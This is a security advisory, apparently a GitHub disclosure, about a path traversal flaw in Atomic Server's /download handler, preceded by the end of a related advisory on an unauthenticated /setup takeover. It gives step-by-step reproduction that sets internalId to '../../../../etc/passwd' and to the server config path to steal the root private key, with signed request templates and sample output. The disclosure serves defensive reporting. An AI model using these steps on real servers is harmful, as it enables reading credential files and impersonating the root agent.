Unauthenticated write to the entire Drive: read/modify/delete any resource, create/alter Agents, reconfigure permissions. This is a complete takeover on a fresh deployment. (It also serves as the entry point of a larger chain: with write access, an attacker can read the server root private key and impersonate root — reported separately.)

## Remediation

- Require a one-time secret (printed to stdout at startup) or operator authentication to redeem `/setup`.
- Invalidate `/setup` after first use with an **atomic** `usagesLeft` decrement (sled transaction) — the current read-check-decrement is a TOCTOU that allows a single-use invite to be redeemed multiple times concurrently.
- Fix the inverted invite-expiry check in `invite.rs` (`if expires > now { reject }` is backwards, so expired invites remain redeemable and valid ones are rejected).

titolo: GHSA-8vc4-8hjq-988p: Atomic Server: Arbitrary file read via user-controlled `internalId` in the `/download` handler (leaks root agent private key)
descrizione:
## Summary

The Commit apply path enforces **no allowlist of writable properties**, so any authenticated Agent can set the `internalId` string (datatype `string`, no character validation) on a resource it owns. The `/download` handler then uses that value **verbatim** as a filesystem path — `file_path.push(internal_id); NamedFile::open(file_path)` — with **no sanitization and no containment check** (`server/src/handlers/download.rs:56-65`). By setting `internalId` to a traversal path (`../../../../etc/passwd`) or an absolute path (`PathBuf::push` of an absolute path replaces the buffer), an attacker reads **any file on the host**. The highest-value target is the server config file storing the **root agent private key**, which yields full server compromise. Only the *upload* path sanitizes filenames (`sanitize_filename`); the *download* path trusts the stored value. The handler also never checks that the resource is a `File`.

## Affected component

- `server/src/handlers/download.rs:56-65` — `file_path.push(internal_id)` + `NamedFile::open`, no sanitization, no `File`-class check.
- `lib/src/commit.rs` (`apply_changes`) — sets any property; no server-managed-property denylist.

## Steps to Reproduce

Environment: `joepmeneer/atomic-server:develop`, `http://localhost:9883`. Attacker is any Agent with write on a parent (self-signup, or via the `/setup` issue reported separately).

1. Create a resource and set `internalId` to a traversal path — sign the Commit and `POST /commit` (200):

```
subject = http://localhost:9883/pwnfile
set = {
  "https://atomicdata.dev/properties/parent": "http://localhost:9883",
  "https://atomicdata.dev/properties/internalId": "../../../../../../../../etc/passwd"
}
```

2. Download it. The auth signature is over the **resolved subject** (the server strips the `/download` prefix → `http://localhost:9883/pwnfile`):

```http
GET /download/pwnfile HTTP/1.1
Host: localhost:9883
x-atomic-public-key: <pubkey>
x-atomic-agent: http://localhost:9883/agents/<pubkey>
x-atomic-timestamp: <ms>
x-atomic-signature: <ed25519("http://localhost:9883/pwnfile <ms>")>
```

Response `200 OK` returns the host `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
...
```

3. Escalate — set `internalId = /atomic-storage/config/config.toml` (absolute path) and download again:

```toml
server      = "http://localhost:9883"
agent       = "http://localhost:9883/agents/+/KwsAmyzc7S/..."
private_key = "REDACTED-ROOT-ED25519-PRIVATE-KEY"   # server root agent key
```

4. Using the stolen key, the attacker signs a Commit with `signer = <root agent>` → `POST /commit` (200) edits data **as root**. Full compromise.

**Expected:** `internalId` treated as a server-managed property and/or `/download` canonicalizes and confines the path to `uploads_path`.
**Actual:** Arbitrary host file read, including the root private key.

## Impact

Arbitrary file read as the server process: `/etc/passwd`, env, TLS keys, the sled DB, K8s service-account tokens, and the **root agent private key** → root impersonation → full read/write/delete of all data. Only a standard account is needed.

## Remediation

- In `download.rs`: `sanitize_filename(internal_id)`, then `canonicalize` and assert the resolved path stays within `uploads_path` before opening; verify the resource is a `File`.
- Add a server-managed-property denylist (`internalId`, rights arrays, etc.) in `lib/src/commit.rs` so clients cannot set them.
